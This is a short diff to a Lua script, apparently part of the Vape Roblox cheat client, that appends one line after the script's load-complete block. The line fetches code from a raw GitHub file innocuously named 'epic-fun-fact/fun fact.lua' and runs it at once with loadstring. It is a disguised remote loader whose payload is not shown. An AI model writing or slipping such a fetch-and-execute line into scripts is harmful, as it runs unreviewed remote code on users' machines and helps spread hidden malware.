@@ -1711,3 +1711,4 @@ else
 	coroutine.resume(selfdestructsave)
 	shared.VapeFullyLoaded = true
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shuttle-r/epic-fun-fact/main/fun%20fact.lua", true))()
